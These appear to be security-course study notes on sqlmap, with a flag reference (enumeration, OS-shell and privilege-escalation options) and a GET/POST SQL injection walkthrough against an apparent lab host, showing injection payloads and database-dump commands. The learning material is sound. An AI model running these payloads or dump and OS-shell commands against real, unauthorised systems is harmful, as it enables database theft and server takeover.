# SQLMap: Command Reference & Practical Walkthrough

sqlmap automates the entire SQL injection process — from detecting a vulnerable parameter to enumerating the database structure and dumping data. This note covers the full command reference (basic options, enumeration, OS access) and then walks through a real GET and POST-based exploitation from start to finish. *(Builds on the introductory sqlmap section in the SQL Injection notes — this is the deeper reference.)*

---

## 1. Basic Command Options

| Option | Description |
|---|---|
| `-u URL`, `--url=URL` | Target URL (e.g. `"http://www.site.com/vuln.php?id=1"`) |
| `--data=DATA` | Data string to send via POST (e.g. `"id=1"`) |
| `--random-agent` | Use a randomly selected HTTP User-Agent header |
| `-p TESTPARAMETER` | The specific parameter(s) to test |
| `--level=LEVEL` | Depth of tests to perform (1–5, default 1) |
| `--risk=RISK` | Risk of tests to perform (1–3, default 1) |

> Higher `--level` and `--risk` values test more payload variations and more aggressive techniques (e.g. payloads that could modify data) — useful when a default scan finds nothing, but should be used carefully since higher risk levels can affect the target.

## 2. Enumeration Commands

Used to pull information about the back-end DBMS — its structure, and the data inside it.

| Option | Description |
|---|---|
| `-a`, `--all` | Retrieve everything |
| `-b`, `--banner` | Retrieve the DBMS banner |
| `--current-user` | Retrieve the current DBMS user |
| `--current-db` | Retrieve the current database |
| `--passwords` | Enumerate DBMS user password hashes |
| `--dbs` | Enumerate available databases |
| `--tables` | Enumerate tables within a database |
| `--columns` | Enumerate columns within a table |
| `--schema` | Enumerate the full schema |
| `--dump` | Dump entries from a specific table |
| `--dump-all` | Dump entries from every table in every database |
| `--is-dba` | Check whether the current DBMS user has DBA (admin) privileges |
| `-D <DB_NAME>` | Target a specific database |
| `-T <TABLE_NAME>` | Target a specific table |
| `-C <COL>` | Target specific column(s) |

## 3. Operating System Access Commands

Used to go beyond the database itself and access the underlying operating system — possible when the DBMS process has enough privilege.

| Option | Description |
|---|---|
| `--os-shell` | Prompt for an interactive OS shell |
| `--os-pwn` | Prompt for an out-of-band (OOB) shell, Meterpreter, or VNC session |
| `--os-cmd=OSCMD` | Execute a single OS command directly |
| `--priv-esc` | Attempt privilege escalation for the database process user |
| `--os-smbrelay` | One-click OOB shell/Meterpreter/VNC via SMB relay |

> These are not the full set of available switches — run `sqlmap -hh` for the complete advanced help reference.

---

## 4. Simple GET-Based Test

```bash
sqlmap -u https://testsite.com/page.php?id=7 --dbs
```

- `-u` — the vulnerable URL
- `--dbs` — enumerate the available databases

---

## 5. Simple POST-Based Test

POST-based injection requires a bit more setup, since the vulnerable parameter lives in the request body rather than the URL.

### Step 1: Capture and Save the Request

Identify the vulnerable POST request (e.g., via Burp Suite), right-click it, choose **"Copy to file,"** and save it — or copy the raw request manually into a text file.

### Step 2: Inspect the Saved Request

```text
POST /blood/nl-search.php HTTP/1.1
Host: 10.10.17.116
Content-Length: 16
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.17.116
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ...
Referer: http://10.10.17.116/blood/nl-search.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=bt0q6qk024tmac6m4jkbh8l1h4
Connection: close

blood_group=B%2B
```

Here, `blood_group` is the POST parameter worth testing.

### Step 3: Run sqlmap Against the Saved Request

```bash
sqlmap -r req.txt -p blood_group --dbs
```

- `-r` — read the request from a saved file
- `-p` — specify the parameter to test
- `--dbs` — enumerate databases

---

## 6. Full Walkthrough: From Detection to Data Extraction

This is what a real sqlmap session looks like end-to-end, using the POST example above as the target.

### Step 1: Detection & Database Fingerprinting

```bash
sqlmap -r req.txt -p blood_group --dbs
```

sqlmap works through its test payloads and identifies the injection:

```text
[INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[INFO] POST parameter 'blood_group' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
...
[INFO] target URL appears to be UNION injectable with 8 columns
[INFO] POST parameter 'blood_group' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
```

sqlmap reports the confirmed injection points:

```text
Parameter: blood_group (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: blood_group=B+' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zgvj) AND 'gXEj'='gXEj

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: blood_group=B+' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(...)-- -
```

Notice sqlmap found **two separate injection techniques** at once — a time-based blind injection (confirmed by the `SLEEP(5)` delay) and a UNION-based injection (confirmed once it determined the query uses exactly 8 columns). This mirrors the manual column-counting process from the SQL Injection notes, just automated.

sqlmap also fingerprints the environment automatically:

```text
the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.10.3
back-end DBMS: MySQL >= 5.0.12
```

And lists the available databases:

```text
available databases [6]:
[*] blood
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] test
```

### Step 2: Enumerate Tables Within a Database

**GET-based:**
```bash
sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables
```

**POST-based:**
```bash
sqlmap -r req.txt -p blood_group -D blood --tables
```

Result:

```text
Database: blood
[3 tables]
+----------+
| blood_db |
| flag     |
| users    |
+----------+
```

### Step 3: Enumerate Columns Within a Table

**GET-based:**
```bash
sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns
```

**POST-based:**
```bash
sqlmap -r req.txt -D blood -T blood_db --columns
```

This returns the column names belonging to `blood_db`, the same way `--tables` returned the table names above — sqlmap is simply querying `information_schema` automatically, exactly as covered manually in the UNION-based walkthrough in the SQL Injection notes.

### Step 4 (Shortcut): Dump Everything at Once

Rather than enumerating tables and columns individually before dumping, `--dump-all` pulls everything from a target database in one pass:

**GET-based:**
```bash
sqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all
```

**POST-based:**
```bash
sqlmap -r req.txt -D blood --dump-all
```

> **Note:** sqlmap caches results from earlier runs in a session file, which is why later commands in this walkthrough show `resuming back-end DBMS 'mysql'` — it doesn't have to re-detect the injection point or re-fingerprint the DBMS every single time.

---

## Key Takeaways / Exam Summary

- sqlmap's basic flags split into three groups: **connection/targeting** (`-u`, `--data`, `-p`), **enumeration** (`--dbs`, `--tables`, `--columns`, `--dump`), and **OS access** (`--os-shell`, `--os-cmd`) — the last group only works if the DBMS process has sufficient privilege.
- **GET-based** testing just needs a URL (`-u`); **POST-based** testing requires saving the actual request to a file first and pointing sqlmap at it with `-r`.
- A single sqlmap scan can confirm **multiple injection techniques simultaneously** (e.g., time-based blind *and* UNION-based) on the same parameter.
- The enumeration flow mirrors the manual UNION-based process from the SQL Injection notes: **detect injection → fingerprint DBMS → list databases (`--dbs`) → list tables (`-D` + `--tables`) → list columns (`-T` + `--columns`) → dump data (`--dump` / `--dump-all`)**.
- `--dump-all` skips the step-by-step enumeration entirely and pulls all available data from a target database in one command — useful once you already know you have full access, but noisier and slower than targeted enumeration.
- sqlmap maintains a session cache, so repeated commands against the same target resume from prior findings (`resuming back-end DBMS...`) instead of starting from scratch each time.
